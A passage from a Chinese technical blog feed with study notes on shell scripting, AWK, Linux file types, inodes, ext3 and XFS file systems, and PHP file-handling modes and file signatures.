    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;一个shell脚本中怎样包含其他脚本&quot;&gt;一个Shell脚本中怎样包含其他脚本？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;source first&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;. first&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;sh  first&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;awk--sed&quot;&gt;AWK &amp;amp; SED&lt;/h1&gt;

&lt;h2 id=&quot;awk是什么&quot;&gt;AWK是什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Awk是一种便于使用且表达能力强的程序设计语言，可应用于各种计算和数据处理任务。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;AWK是贝尔实验室1977年搞出来的文本出现神器&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;之所以叫AWK是因为其取了三位创始人 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 的Family Name的首字符。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;awk中有那些特殊变量各有什么含义&quot;&gt;AWK中有那些特殊变量？各有什么含义？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;$0&lt;/code&gt; 当前记录（这个变量中存放着整个行的内容）&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;$1~$n&lt;/code&gt; 当前记录的第n个字段，字段间由FS分隔&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;FS&lt;/code&gt; 输入字    段分隔符 默认是空格或Tab&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;NF&lt;/code&gt;当前记录中的字段个数，  就是有多少列&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;NR&lt;/code&gt;已经读出的记录数，就是行号，从1开 始，如果有多个文件话，这个值也是不断累加中。&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;FNR&lt;/code&gt; 当前记录数，与NR不同的是，这个值会是各个文件自己的行号&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;RS&lt;/code&gt;输入的记录分隔符， 默认为换行符&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;OFS&lt;/code&gt;输出字段分隔符 默认也是空格&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;ORS&lt;/code&gt;输出的记录分隔符，默认为换行符&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;FILENAME&lt;/code&gt;当前输入文件的名字&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;怎样通过awk对一个文本文件按列拆分&quot;&gt;怎样通过AWK对一个文本文件按列拆分？&lt;/h2&gt;

&lt;h2 id=&quot;怎样通过awk统计一个web访问日志中发起post提交最多的ip地址和提交次数&quot;&gt;怎样通过AWK统计一个WEB访问日志中发起POST提交最多的IP地址和提交次数？&lt;/h2&gt;

&lt;h2 id=&quot;怎样通过sed实现文本的查找替换&quot;&gt;怎样通过SED实现文本的查找，替换？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;http://zh.wikipedia.org/wiki/Linux&quot;&gt;Linux&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://coolshell.cn/articles/1032.html&quot;&gt;Unix 40年：Unix年鉴&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://coolshell.cn/articles/4535.html&quot;&gt;一些软件设计的原则&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.admin10000.com/document/4477.html&quot;&gt;趣图图解SOLID软件开发原则&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.ibm.com/developerworks/cn/linux/l-linux-filesystem/&quot;&gt;Linux 文件系统剖析&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://courses.edx.org/c4x/LinuxFoundationX/LFS101x/asset/LFS101_Ch3_Sec1_FSH.pdf&quot;&gt;Filesystem Hierarchy Standard&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://refspecs.linuxfoundation.org/fhs.shtml&quot;&gt;Filesystem Hierarchy Standard&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://mooc.guokr.com/note/13463/&quot;&gt;Linux文件层次标准&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.ruanyifeng.com/blog/2013/08/linux_boot_process.html&quot;&gt;Linux 的启动流程&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.ibm.com/developerworks/cn/linux/l-lpic1-v3-101-3/&quot;&gt;学习 Linux, 101: 运行级别、关机和重启&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://vbird.dic.ksu.edu.tw/linux_basic/0210filepermission.php&quot;&gt;Linux 的文件权限与目录配置&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/&quot;&gt;理解 Linux 的硬链接与软链接&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.ruanyifeng.com/blog/2009/10/5_ways_to_search_for_files_using_the_terminal.html&quot;&gt;Linux的五个查找命令&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://content.hccfl.edu/pollock/Unix/FindCmd.htm&quot;&gt;A Unix/Linux “find” Command Tutorial&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.cnblogs.com/me115/p/3427319.html&quot;&gt;Linux Shell 文本处理工具集锦&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.ruanyifeng.com/blog/2011/07/linux_load_average_explained.html&quot;&gt;理解Linux系统负荷&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://blog.scoutapp.com/articles/2009/07/31/understanding-load-averages&quot;&gt;Understanding Linux CPU Load&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.cnblogs.com/barrychiao/archive/2012/10/22/2733210.html&quot;&gt;shell变量详解&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://awk.readthedocs.org/en/latest/chapter-one.html&quot;&gt;AWK程序设计语言&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://coolshell.cn/articles/9070.html&quot;&gt;AWK 简明教程&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.gnu.org/software/gawk/manual/gawk.html&quot;&gt;The GNU Awk User’s Guide&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.ibm.com/developerworks/cn/linux/l-iotips/&quot;&gt;技巧：Linux I/O重定向的一些小技巧&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.oracle.com/technetwork/cn/articles/calish-find-096463-zhs.html&quot;&gt;Linux Find 命令精通指南&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.oschina.net/translate/15-practical-unix-linux-find-command-examples-part-2&quot;&gt;爹地，我找到了!, 15个极好的Linux find命令示例&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.oschina.net/translate/15-practical-linux-find-command-examples&quot;&gt;妈咪，我找到了! – 15个实用的Linux find命令示例&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://docs.oracle.com/cd/E56344_01/html/E54075/find-1.html&quot;&gt;用户命令 find&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://man.chinaunix.net/&quot;&gt;Man手册中心&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www-01.ibm.com/support/knowledgecenter/ssw_aix_61/com.ibm.aix.cmds2/find.htm?lang=zh&quot;&gt;find 命令&lt;/a&gt;\&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>PHP文件核心编程</title>
   <link href="http://yanpeipan.github.io/2014/12/21/php%E6%96%87%E4%BB%B6%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B.html"/>
   <updated>2014-12-21T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2014/12/21/php文件核心编程</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;文件和文件系统&quot;&gt;文件和文件系统&lt;/h1&gt;

&lt;h2 id=&quot;什么是文件在linux下什么是文件呢&quot;&gt;什么是文件，在Linux下什么是文件呢？&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;在Linux系统中，无论是常见的数据文件、可执行文件，还是一个目录，甚至设备都以文件的形式存在。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;linux下文件类型有哪些&quot;&gt;Linux下文件类型有哪些？&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;文件类型&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;缩写&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;英文&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;其他名称&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;普通文件&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Regular file&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;目录文件&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;d&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Directory file&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;块特殊文件&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;b&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Block special file&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;块设备文件&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;字符设备文件&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;c&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Character special file&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;字符设备文件&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;先进先出&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;FIFO&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;named pipe，命名管道&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;套接字文件&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;s&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Socket&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;符号链接&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;l&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Symbolic link&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;软链接&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;什么时inode&quot;&gt;什么时inode？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;文件储存在硬盘上，硬盘的最小存储单位叫做”扇区”（Sector）。每个扇区储存512字节（相当于0.5KB）。&lt;br /&gt;
操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个”块”（block）。这种由多个扇区组成的”块”，是文件存取的最小单位。”块”的大小，最常见的是4KB，即连续八个 sector组成一个 block。&lt;br /&gt;
文件数据都储存在”块”中，那么很显然，我们还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为”索引节点”。&lt;br /&gt;
每一个文件都有对应的inode，里面包含了与该文件有关的一些信息。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;inode包含什么内容&quot;&gt;inode包含什么内容？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;文件的字节数&lt;/li&gt;
  &lt;li&gt;文件拥有者的User ID&lt;/li&gt;
  &lt;li&gt;文件的Group ID&lt;/li&gt;
  &lt;li&gt;文件的读、写、执行权限&lt;/li&gt;
  &lt;li&gt;文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。&lt;/li&gt;
  &lt;li&gt;链接数，即有多少文件名指向这个inode&lt;/li&gt;
  &lt;li&gt;文件数据block的位置&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;如何得知文件名最长能到多少&quot;&gt;如何得知文件名最长能到多少？&lt;/h2&gt;

&lt;p&gt;获取最长文件路径长度：&lt;code&gt;getconf PATH_MAX /root&lt;/code&gt;&lt;br /&gt;
获取最长文件名：&lt;code&gt;getconf NAME_MAX /root&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;如何获取文件的inode信息&quot;&gt;如何获取文件的inode信息？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;可以用stat命令，查看某个文件的inode信息：　&lt;code&gt;stat example.txt&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;ext3文件系统有什么特点&quot;&gt;ext3文件系统有什么特点？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;日志文件系统（英语：Journaling file system），一种文件系统，指在文件系统发生变化时，先把相关的信息写入一个被称为日志的区域，然后再把变化写入主文件系统的文件系统。在文件系统发生故障（如内核崩溃或突然停电）时，日志文件系统更容易保持一致性，并且可以较快恢复。&lt;/li&gt;
  &lt;li&gt;位目录跨越多个块提供基于树的目录索引&lt;/li&gt;
  &lt;li&gt;在线系统增长&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;exbibyte是什么单位和tb如何换算&quot;&gt;Exbibyte是什么单位，和Tb如何换算？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Exbibyte（exa binary byte的缩写），简称EiB，是一个电脑容量单位，即1,152,921,504,606,846,976字节，是1PiB的1024倍， 是1TiB的1024^2倍。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;xfs文件系统有什么特点&quot;&gt;XFS文件系统有什么特点？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;XFS，一种高性能的日志文件系统，最早于1993年，由Silicon Graphics为他们的IRIX操作系统而开发，是IRIX 5.3版的默认文件系统。2000年5月，Silicon Graphics以GNU通用公共许可证发布这套系统的源代码，之后被移植到Linux 内核上。XFS 特别擅长处理大文件，同时提供平滑的数据传输。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;XFS是一个64位文件系统，最大支持 8exbibytes 减1字节的单个文件系统，实际部署时取决于宿主操作系统的最大块限制。对于一个32位Linux系统，文件和文件系统的大小会被限制在 16tebibytes。&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;日志文件系统是一种即使在断电或者是操作系统崩溃的情况下保证文件系统一致性的途径。XFS对文件系统元数据提供了日志支持。当文件系统更新时，元数据会在实际的磁盘块被更新之前顺序写入日志。XFS的日志被保存在磁盘块的循环缓冲区上，不会被正常的文件系统操作影响。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XFS文件系统内部被分为多个“分配组”，它们是文件系统中的等长线性存储区。每个分配组各自管理自己的inode和剩余空间。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在条带化RAID阵列上创建XFS文件系统时，可以指定一个“条带化数据单元”。这可以保证数据分配、inode分配、以及内部日志被对齐到该条带单元上，以此最大化吞吐量。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XFS文件系统中的文件用到的块由变长Extent管理，每一个Extent描述了一个或多个连续的块。与那些把文件所有块都单独列出来的文件系统来说，extent大幅缩短了列表。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;块是文件系统中的最小可分配单元。XFS允许在创建文件系统时指定块的大小，从 512 字节到 64KB，以适应专门的用途。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XFS在文件分配上使用了惰性计算技术。当一个文件被写入缓存时，XFS简单地在内存中对该文件保留合适数量的块，而不是立即对数据分配Extent。实际的块分配仅在这段数据被冲刷到磁盘时才发生。这一机制提高了将这一文件写入一组连续的块中的机会，减少碎片的同时提升了性能。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XFS对每个文件提供了一个64位的稀疏地址空间，使得大文件中的“洞”（空白数据区）不被实际分配到磁盘上。因为文件系统对每个文件使用一个Extent表，文件分配表就可以保持一个较小的体积。对于太大以至于无法存储在inode中的分配表，这张表会被移动到B+树中，继续保持对该目标文件在64位地址空间中任意位置的数据的高效访问。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XFS通过实现扩展文件属性给文件提供了多个数据流，使文件可以被附加多个名/值对。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;对于要求高吞吐量的应用，XFS给用户空间提供了直接的、非缓存I/O的实现。数据在应用程序的缓冲区和磁盘间利用DMA进行传输，以此提供下级磁盘设备全部的I/O带宽。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XFS确定速率I/O系统给应用程序提供了预留文件系统带宽的API。XFS会动态计算下级存储设备能提供的性能，并在给定的时间内预留足够的带宽以满足所要求的性能。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XFS实现了数据管理应用程序接口（DMAPI)以支持高阶存储管理(HSM)。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XFS并不直接提供对文件系统快照的支持，因为XFS认为快照可在卷管理器中实现。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;虽然XFS基于Extent的特征和延迟分配策略显著提高了文件系统对碎片问题的抵抗力，XFS还是提供了一个文件系统碎片整理工具，xfs_fsr（XFS filesystem reorganizer的简称）。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XFS提供了 xfs_growfs 工具，可以在线调整XFS文件系统的大小。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XFS提供了 xfsdump 和 xfsrestore 工具协助备份XFS文件系统中的数据。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;XFS的磁盘配额在文件系统被初次挂载时启用。这解决了一个在其它大多数文件系统中存在的一个竞争问题：要求先挂载文件系统，但直到调用quotaon(8)之前配额不会生效。&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;文本文件和二进制文件&quot;&gt;文本文件和二进制文件&lt;/h1&gt;

&lt;h2 id=&quot;如何判断一个文件是文本文件&quot;&gt;如何判断一个文件是文本文件？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;二进制文件（英语：Binary file）一般指包含ASCII及扩展ASCII字符中编写的数据或程序指令的文件。广义的二进制文件即为文件，由文件在外部存储设备的存放方式为二进制而得名。狭义的二进制文件即指除文本文件以外的文件。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;文本文件一般指只有字符原生编码构成的二进制计算机文件，于富文本相比，其不包含字样样式的控制元素，能够被最简单的文本编辑器直接读取。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code&gt;file ~/.viminfo&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;文本文件和二进制文件有什么不同&quot;&gt;文本文件和二进制文件有什么不同？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;编码方式不同，文本文件使用字符编码，ASCII单字节编码、UTF-8可变长度字符编码等。二进制文件是基于值编码的文件, 可以根据协议自定义单个bit含义, 节省存储空间。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;文件的打开方式&quot;&gt;文件的打开方式&lt;/h1&gt;

&lt;h2 id=&quot;文件打开方式有哪些各是什么含义&quot;&gt;文件打开方式有哪些？各是什么含义？&lt;/h2&gt;

&lt;p&gt;‘r’	只读方式打开，将文件指针指向文件头。&lt;br /&gt;
‘r+’	读写方式打开，将文件指针指向文件头。&lt;br /&gt;
‘w’	写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。&lt;br /&gt;
‘w+’	读写方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。&lt;br /&gt;
‘a’	写入方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。&lt;br /&gt;
‘a+’	读写方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。&lt;br /&gt;
‘x’	创建并以写入方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建之。这和给 底层的 open(2) 系统调用指定 O_EXCL|O_CREAT 标记是等价的。&lt;br /&gt;
‘x+’	创建并以读写方式打开，其他的行为和 ‘x’ 一样。&lt;br /&gt;
‘c’	Open the file for writing only. If the file does not exist, it is created. If it exists, it is neither truncated (as opposed to ‘w’), nor the call to this function fails (as is the case with ‘x’). The file pointer is positioned on the beginning of the file. This may be useful if it’s desired to get an advisory lock (see flock()) before attempting to modify the file, as using ‘w’ could truncate the file before the lock was obtained (if truncation is desired, ftruncate() can be used after the lock is requested).&lt;br /&gt;
‘c+’	Open the file for reading and writing; otherwise it has the same behavior as ‘c’.&lt;/p&gt;

&lt;h2 id=&quot;文件指针是什么意思如何操作文件指针&quot;&gt;文件指针是什么意思，如何操作文件指针？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;一个指针变量指向一个文件，这个指针称为文件指针。通过文件指针就可对它所指的文件进行各种操作。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;fclose()：关闭文件指针。&lt;/li&gt;
  &lt;li&gt;feof()：测试文件指针是否到了文件结束的位置。&lt;/li&gt;
  &lt;li&gt;fseek()：在文件指针中定位。&lt;/li&gt;
  &lt;li&gt;rewind()：倒回文件指针的位置。&lt;/li&gt;
  &lt;li&gt;ftell()：返回文件指针读/写的位置。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;文件打开标记t如何使用有什么作用&quot;&gt;文件打开标记（’t’）如何使用，有什么作用？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;文本	用语与其他模式的结合，这个模式只是Windows系统下的一个选项，它不是一个推荐选项，除非你曾经在代买中使用了b选项。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么时候需要用二进制模式打开文件&quot;&gt;什么时候需要用二进制模式打开文件？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code&gt;b&lt;/code&gt; 二进制模式——与其他模式进行连接，如果文件系统能够区分二进制文件和文本文件，你可能会使用它，Windows系统可以区分，UNIX系统则不区分，推荐一直使用这个选项，以便获得最大程度的可移植性，二进制模式是默认的模式&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么叫做二进制安全为什么会出现二进制不安全&quot;&gt;什么叫做二进制安全？为什么会出现二进制不安全？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;二进制安全功能（binary-safe function）是指在一个二进制文件上所执行的不更改文件内容的功能或者操作。这能够保证文件不会因为某些操作而遭到损坏。二进制数据是按照一串0和1的形式编码的。而绝大多数的程序会给某些特殊的比特串赋予不同的格式代码，所以当用户使用一个程序读取一个二进制文件时，该文件会被按照这个程序的规则进行解释。如果这个程序所使用的格式编码和文件被写入的格式编码一致，那么这个文件可以被正常读取，否则该文件的格式代码之中会被附加一些无意义的符号，也可能会导致文件损坏。如果最严重的情况发生，这样的操作会因为损坏导致你的数据永久丢失。所以你应该将重要的文件保存在只读性的存储介质上，例如光盘。&lt;br /&gt;
　　还有人说是此乃密码学范畴——二进制安全是指，在传输数据时，保证二进制数据的信息安全，也就是不被篡改、破译等，如果被攻击，能够及时检测出来。 二进制安全包含了密码学的一些东西，比如加解密、签名等。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;　二进制安全是一种主要用于字符串操作函数相关的计算机编程术语。一个二进制安全功能（函数），其本质上将操作输入作为原始的、无任何特殊格式意义的数据流。其在操作上应包含一个字符所能有的256种可能的值（假设为8为字符）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;如何利用文件的打开模式轻松实现多个文件的合并&quot;&gt;如何利用文件的打开模式，轻松实现多个文件的合并？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;cat f1 f2 f3 f4 f5 &amp;gt; f6&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;文件的顺序存取和随机存取&quot;&gt;文件的顺序存取和随机存取&lt;/h1&gt;

&lt;h2 id=&quot;什么是顺序读取如何实现顺序读取文件&quot;&gt;什么是顺序读取？如何实现顺序读取文件？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;所谓“随机存取”，指的是当存储器中的消息被读取或写入时，所需要的时间与这段信息所在的位置无关。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是随机存取如何实现随机存取文件&quot;&gt;什么是随机存取？如何实现随机存取文件？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;所谓“随机存取”，指的是当存储器中的消息被读取或写入时，所需要的时间与这段信息所在的位置无关。相对的，读取或写入顺序访问（Sequential Access）存储设备中的信息时，其所需要的时间与位置就会有关系&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;于数据结构中，随机存取暗指可由一堆数字之中，能够持续访问N值的能力，而且除了数组（及相关结构，例如动态数组）以外，绝少数据结构能够作出类似程序。另外，随机存取对不少算法，如快速排序及二元搜索而言不可或缺。其他数据结构，如合并排序，则凭随机存取作出有效率的输入、删除抑或搜索功能。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;文件指针函数有哪些各是什么用途&quot;&gt;文件指针函数有哪些？各是什么用途？&lt;/h2&gt;

&lt;h2 id=&quot;什么是纯真ip数据库&quot;&gt;什么是纯真IP数据库？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://ip.qq.com/&quot;&gt;腾讯IP分享计划_IP分享&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://int.dpool.sina.com.cn/iplookup/iplookup.php?ip=8.8.8.8&amp;amp;format=js&quot;&gt;新浪&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://developer.baidu.com/map/ip-location-api.htm&quot;&gt;百度Web服务 Geocoding API-百度地图&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://ip.taobao.com/accurancy.php&quot;&gt;淘宝IP地址库&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.maxmind.com/zh/home&quot;&gt;MaxMind - IP地理定位和在线欺诈预防&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.cz88.net/&quot;&gt;纯真&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://tool.17mon.cn/ipdb.html&quot;&gt;17mon&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;如何用php解析纯真ip数据库&quot;&gt;如何用PHP解析纯真IP数据库？&lt;/h2&gt;

&lt;h2 id=&quot;如何用php判断一个文件是不是png图片&quot;&gt;如何用PHP判断一个文件是不是png图片？&lt;/h2&gt;

&lt;p&gt;1.JPEG&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)&lt;/li&gt;
  &lt;li&gt;文件结束标识 (2 bytes): 0xff, 0xd9 (EOI)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;2.TGA&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;未压缩的前5字节    00 00 02 00 00&lt;/li&gt;
  &lt;li&gt;RLE压缩的前5字节   00 00 10 00 00&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;3.PNG&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;文件头标识 (8 bytes)   89 50 4E 47 0D 0A 1A 0A&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;4.GIF&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;文件头标识 (6 bytes)   47 49 46 38 39(37) 61
                                      G    I   F   8    9 (7)   a&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;5.BMP&lt;/p&gt;
&lt;ul&gt;
